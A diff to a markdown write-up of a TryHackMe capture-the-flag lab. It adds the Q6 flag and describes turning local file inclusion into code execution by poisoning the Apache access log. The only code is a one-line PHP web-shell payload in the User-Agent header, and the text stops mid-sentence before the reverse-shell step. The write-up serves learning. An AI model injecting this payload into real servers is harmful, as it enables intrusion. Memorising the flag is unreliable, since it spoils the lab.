@@ -83,7 +83,7 @@ I didn't get a shell but i got the flag in Q4
 
 ---
 ## Q6: Get User 2 flag
-### A: 
+### A: thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
 
 Searchin a bit on the internet i found that i can go from LFI to RCE with a poison attack, so i follow it
 
@@ -91,7 +91,11 @@ First i go to the apache/access.log and send it to burpsuite
 
 ![](../Img/Pasted%20image%2020260315152115.png)
 
+I modified the user agent with `<?php system($_GET['cmd']); ?>` and send it
 
+![](../Img/Pasted%20image%2020260315154918.png)
+
+I the do a reverse shell from
 
 ## Q7: Root the machine and find the root flag
 ### A: 
